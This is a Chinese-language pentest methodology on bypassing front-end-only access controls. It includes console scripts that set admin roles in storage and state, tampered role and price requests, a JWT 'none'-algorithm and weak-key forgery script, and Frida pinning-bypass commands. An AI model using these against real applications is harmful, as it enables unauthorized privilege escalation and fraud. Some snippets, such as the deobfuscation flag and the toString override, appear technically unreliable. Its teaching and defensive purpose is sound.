# 前端控制绕过方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的前端权限控制绕过测试流程，帮助识别和利用仅依赖前端实现的访问控制机制，揭示"虚假安全"带来的风险。

## 1.2 适用范围

本文档适用于以下场景：
- 单页应用（SPA）如 React、Vue、Angular 应用
- 移动应用（iOS/Android）
- 混合应用（Electron、React Native、Flutter）
- 任何在客户端执行权限检查的应用

## 1.3 读者对象

- 执行前端安全测试的渗透测试人员
- 进行客户端代码审计的安全分析师
- 负责前端安全开发的开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：前端控制绕过

### 2.1 技术介绍

前端控制绕过是指攻击者通过修改、绕过或重放客户端（浏览器/应用）的权限检查逻辑，实现未授权访问或权限提升的攻击技术。

**核心原理：**
```
┌─────────────────────────────────────────────────────────┐
│                    攻击者视角                            │
├─────────────────────────────────────────────────────────┤
│  前端控制 = "建议性"而非"强制性"                          │
│  客户端代码完全可控 = 所有前端检查均可绕过                 │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│                  安全控制对比                            │
├─────────────────────────────────────────────────────────┤
│  ❌ 前端控制（不安全）：                                  │
│     用户点击 → 前端检查权限 → 发送请求 → 后端执行         │
│                                                         │
│  ✅ 后端控制（安全）：                                    │
│     用户点击 → 发送请求 → 后端检查权限 → 执行/拒绝        │
└─────────────────────────────────────────────────────────┘
```

**前端控制漏洞本质：**
1. **代码可见性** - 所有前端代码对攻击者透明
2. **逻辑可修改** - 攻击者可修改任何前端逻辑
3. **请求可伪造** - 任何请求都可被重放和修改
4. **状态可操控** - Cookie、LocalStorage、内存状态均可修改

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **菜单/按钮隐藏** | 管理员菜单、删除按钮 | 仅隐藏 UI，接口未验证权限 |
| **路由守卫** | Vue Router、React Router 守卫 | 前端路由检查，后端无验证 |
| **条件渲染** | `v-if="user.isAdmin"` | 仅控制显示，不控制访问 |
| **禁用状态** | 禁用按钮、只读表单 | 可直接发送请求绕过 |
| **客户端令牌验证** | JWT 在前端解码验证 | 可伪造或修改令牌 |
| **功能开关** | Feature Flag 客户端控制 | 可修改开关状态 |
| **价格计算** | 购物车价格前端计算 | 可修改价格参数 |
| **表单验证** | 输入限制、必填项检查 | 可直接发送请求绕过 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：前端代码分析**
```bash
# 1. 查找权限相关代码
# 在浏览器开发者工具中搜索关键词
grep -r "isAdmin" static/js/
grep -r "permission" static/js/
grep -r "role" static/js/
grep -r "canAccess" static/js/
grep -r "shouldRender" static/js/

# 2. 查找路由配置
# Vue Router
grep -r "meta.*role" static/js/
# React Router
grep -r "PrivateRoute" static/js/

# 3. 查找 API 端点
grep -r "api/" static/js/ | grep -v node_modules
```

**步骤二：UI 隐藏元素探测**
```javascript
// 浏览器控制台执行
// 1. 显示所有隐藏元素
document.querySelectorAll('[hidden]').forEach(el => el.hidden = false);
document.querySelectorAll('[style*="display:none"]').forEach(el => el.style.display = 'block');
document.querySelectorAll('.hidden').forEach(el => el.classList.remove('hidden'));

// 2. 启用所有禁用元素
document.querySelectorAll(':disabled').forEach(el => el.disabled = false);
document.querySelectorAll('[readonly]').forEach(el => el.readOnly = false);

// 3. 显示所有被注释的元素（需要查看源码）
// 查看 HTML 注释中的内容
```

**步骤三：本地存储检查**
```javascript
// 浏览器控制台执行
// 1. 检查 LocalStorage
console.log('LocalStorage:', localStorage);

// 2. 检查 SessionStorage
console.log('SessionStorage:', sessionStorage);

// 3. 检查 Cookie
console.log('Cookies:', document.cookie);

// 4. 检查 IndexedDB
// 在 Application 面板查看

// 5. 修改权限相关值
localStorage.setItem('isAdmin', 'true');
localStorage.setItem('userRole', 'admin');
sessionStorage.setItem('permissions', JSON.stringify(['delete', 'update']));
```

**步骤四：请求拦截和修改**
```bash
# 使用 Burp Suite 或浏览器开发者工具

# 1. 拦截请求，修改权限参数
# 原始请求
POST /api/update-profile
{"userId": 123, "role": "user"}

# 修改后
POST /api/update-profile
{"userId": 123, "role": "admin"}

# 2. 添加缺失的权限头
# 原始请求
GET /api/admin/users

# 添加权限头
GET /api/admin/users
X-User-Role: admin
X-Is-Admin: true

# 3. 修改 JWT 令牌
# 解码 → 修改 → 重新编码 → 发送
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查权限检查是否仅在前端执行
2. 检查路由守卫是否有后端验证
3. 检查敏感操作是否有二次确认（后端）
4. 检查价格计算是否在后端重新计算

**示例（不安全的前端控制）：**
```javascript
// ❌ 不安全 - 仅前端检查
function deleteDocument(docId) {
  if (currentUser.role !== 'admin') {
    alert('无权操作');
    return;
  }
  // 前端检查可绕过，直接调用 API
  api.delete(`/documents/${docId}`);
}

// ✅ 安全 - 后端验证
function deleteDocument(docId) {
  // 前端只做 UX 提示，实际权限在后端验证
  api.delete(`/documents/${docId}`)
    .catch(error => {
      if (error.status === 403) {
        alert('无权操作');
      }
    });
}

// ❌ 不安全 - 前端价格计算
function checkout(items) {
  const total = items.reduce((sum, item) => sum + item.price, 0);
  api.post('/checkout', { items, total });  // 价格可篡改
}

// ✅ 安全 - 后端价格计算
function checkout(items) {
  api.post('/checkout', { items });  // 后端重新计算价格
}
```

### 2.4 漏洞利用方法

#### 2.4.1 修改本地状态

```javascript
// 浏览器控制台执行

// 1. 修改 Vuex/Redux 状态
// Vuex (Vue)
this.$store.state.user.role = 'admin';
this.$store.commit('SET_ROLE', 'admin');

// Redux (React)
// 需要找到 store 对象
window.store.dispatch({ type: 'SET_ROLE', payload: 'admin' });

// 2. 修改组件实例
// 找到 Vue 组件实例
const app = document.querySelector('#app').__vue__;
app.userRole = 'admin';
app.isAdmin = true;

// 3. 修改 React 组件状态
// 使用 React DevTools 或找到组件实例
```

#### 2.4.2 绕过路由守卫

```javascript
// 方法 1: 直接导航
// 即使前端路由阻止，直接输入 URL 或使用控制台
window.location.href = '/admin/dashboard';

// 方法 2: 修改路由配置
// Vue Router
router.beforeEach((to, from, next) => next());  // 绕过所有守卫

// React Router
// 修改 history 对象
history.push('/admin/dashboard');

// 方法 3: 使用开发者工具
// 在 Network 面板直接重放 API 请求
```

#### 2.4.3 修改请求参数

```bash
# 使用 Burp Suite Repeater

# 1. 修改用户 ID/角色
POST /api/update-profile
Content-Type: application/json

{"id": 123, "role": "user"}  # 原始
{"id": 123, "role": "admin"} # 修改

# 2. 添加管理员头
POST /api/delete-user
X-Admin-Key: supersecret
X-Is-Admin: true

# 3. 修改价格参数
POST /api/checkout
{"items": [...], "total": 9999}  # 篡改价格

# 4. 利用参数污染
GET /api/admin/users?role=user&role=admin
```

#### 2.4.4 JWT 令牌篡改

```bash
# 1. 解码 JWT（使用 jwt.io 或命令行）
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ" | base64 -d

# 2. 修改 payload
# 原始：{"sub": "123", "role": "user"}
# 修改：{"sub": "123", "role": "admin"}

# 3. 如果算法是 none
# 修改 header 为 {"alg": "none"}
# 删除签名部分

# 4. 如果知道密钥，重新签名
# 使用 jwt.io 或 Python 脚本
```

```python
#!/usr/bin/env python3
"""JWT 篡改脚本"""
import jwt

# 原始令牌
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.xxx"

# 方法 1: 算法 none 攻击
decoded = jwt.decode(token, options={"verify_signature": False})
decoded['role'] = 'admin'
forged = jwt.encode(decoded, '', algorithm='none')
print(f"None 算法伪造：{forged}")

# 方法 2: 弱密钥爆破
secret = 'secret'  # 常见弱密钥
forged = jwt.encode(decoded, secret, algorithm='HS256')
print(f"弱密钥伪造：{forged}")

# 方法 3: 密钥混淆攻击 (RS256 -> HS256)
# 如果服务端使用 RSA 公钥验证，可尝试用公钥作为 HS256 密钥
```

#### 2.4.5 自动化工具

```javascript
// 浏览器控制台注入脚本
// 保存为 bookmarklet 或直接在控制台运行

(function() {
  // 1. 显示所有隐藏的管理功能
  document.querySelectorAll('[class*="admin"], [id*="admin"]')
    .forEach(el => {
      el.style.display = 'block';
      el.hidden = false;
    });
  
  // 2. 启用所有禁用的按钮
  document.querySelectorAll('button:disabled')
    .forEach(el => el.disabled = false);
  
  // 3. 修改所有权限检查
  const originalToString = Function.prototype.toString;
  Function.prototype.toString = function() {
    const result = originalToString.call(this);
    if (result.includes('isAdmin') || result.includes('permission')) {
      return 'return true;';
    }
    return result;
  };
  
  // 4. 修改 LocalStorage/SessionStorage
  localStorage.setItem('admin', 'true');
  sessionStorage.setItem('role', 'admin');
  
  console.log('[+] 前端控制绕过脚本已注入');
})();
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过代码混淆

```bash
# 1. 使用反混淆工具
# JavaScript 反混淆
npx javascript-obfuscator --reverse-obfuscation input.js

# 2. 使用浏览器开发者工具
# Chrome DevTools 的 Pretty Print 功能

# 3. 使用在线工具
# https://lelinhtinh.github.io/de4js/

# 4. 动态调试
# 在关键函数处设置断点
# 观察变量和调用栈
```

#### 2.5.2 绕过完整性检查

```javascript
// 如果应用检查代码完整性
// 方法 1: 在检查前注入
(function() {
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    // 在请求前修改
    console.log('Fetch called with:', args);
    return originalFetch.apply(this, args);
  };
})();

// 方法 2: 禁用完整性检查函数
// 找到检查函数并覆盖
window.verifyIntegrity = () => true;
window.checkCodeHash = () => true;
```

#### 2.5.3 绕过证书锁定

```bash
# 对于移动应用或 Electron 应用
# 方法 1: 使用 Frida 绕过
frida -U -f com.example.app -l bypass-ssl.js

# 方法 2: 修改应用配置
# Android: 修改 network_security_config.xml
# iOS: 修改 Info.plist

# 方法 3: 使用已信任的 CA
# 将 Burp CA 安装到系统信任存储
```

#### 2.5.4 利用 Webview 漏洞

```javascript
// 对于混合应用
// 1. 注入 JavaScript
webview.loadUrl("javascript:alert(document.cookie)");

// 2. 拦截请求
webview.setWebViewClient(new WebViewClient() {
  @Override
  public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
    // 修改请求/响应
  }
});

// 3. 利用 addJavascriptInterface
// 如果暴露了不安全的方法
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **UI 绕过** | 显示隐藏元素 | `$('[hidden]').show()` | jQuery 显示隐藏元素 |
| **UI 绕过** | 启用禁用按钮 | `$('button:disabled').prop('disabled', false)` | 启用所有禁用按钮 |
| **状态修改** | LocalStorage | `localStorage.setItem('role', 'admin')` | 修改本地存储 |
| **状态修改** | Vuex | `this.$store.state.role = 'admin'` | 修改 Vuex 状态 |
| **路由绕过** | 直接导航 | `window.location = '/admin'` | 绕过前端路由 |
| **JWT 攻击** | 算法 none | `{"alg": "none"}` | 空签名攻击 |
| **JWT 攻击** | 修改声明 | `{"role": "admin"}` | 修改权限声明 |
| **请求修改** | 添加权限头 | `X-Is-Admin: true` | 添加管理员头 |
| **请求修改** | 修改参数 | `role=user` → `role=admin` | 修改请求参数 |

## 3.2 前端控制测试检查清单

### UI 控制
- [ ] 隐藏的管理功能是否可直接访问
- [ ] 禁用的按钮是否可启用
- [ ] 只读的表单是否可修改
- [ ] 条件渲染的内容是否可显示

### 路由控制
- [ ] 前端路由守卫是否可绕过
- [ ] 直接访问 URL 是否验证权限
- [ ] 浏览器后退/前进是否绕过检查
- [ ] 书签访问是否受限

### 状态管理
- [ ] LocalStorage 是否可修改权限
- [ ] SessionStorage 是否可篡改
- [ ] Vuex/Redux 状态是否可修改
- [ ] Cookie 是否可伪造

### 令牌安全
- [ ] JWT 是否可篡改
- [ ] 是否接受 none 算法
- [ ] 密钥是否可爆破
- [ ] 令牌是否在服务端验证

### 请求安全
- [ ] 请求参数是否可修改
- [ ] 请求头是否可伪造
- [ ] 请求是否可重放
- [ ] 敏感操作是否有 CSRF 保护

## 3.3 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **Burp Suite** | 请求拦截修改 | 使用 Repeater 修改请求 |
| **浏览器 DevTools** | 代码分析和调试 | Console 执行注入脚本 |
| **React DevTools** | React 组件检查 | 检查和修改组件状态 |
| **Vue DevTools** | Vue 组件检查 | 检查和修改 Vuex 状态 |
| **Frida** | 动态插桩 | `frida -U -f app -l script.js` |
| **JWT Editor** | JWT 编辑和攻击 | Burp 扩展 |
| **Postman** | API 测试 | 构造和发送请求 |
| **JavaScript Deobfuscator** | 代码反混淆 | 在线或本地工具 |

## 3.4 前端安全最佳实践

```javascript
// ❌ 不安全模式
function checkPermission() {
  if (user.role === 'admin') {  // 前端检查
    showAdminButton();
  }
}

// ✅ 安全模式
// 1. 前端只做 UX 优化，不依赖前端做安全控制
function renderUI() {
  // 根据后端返回的权限渲染 UI
  if (serverResponse.permissions.includes('admin')) {
    showAdminButton();
  }
}

// 2. 所有敏感操作在后端验证
app.post('/delete-user', authMiddleware, (req, res) => {
  if (!req.user.hasPermission('delete_user')) {  // 后端验证
    return res.status(403).send('Forbidden');
  }
  // 执行操作
});

// 3. 使用短寿命令牌
// 4. 实施适当的 CORS 策略
// 5. 添加 CSRF 令牌
```

---

## 参考资源

- [OWASP Client-Side Security](https://cheatsheetseries.owasp.org/)
- [PortSwigger - Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP Top 10 - Client-Side](https://owasp.org/www-project-top-ten-client-side-security/)
- [JWT Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
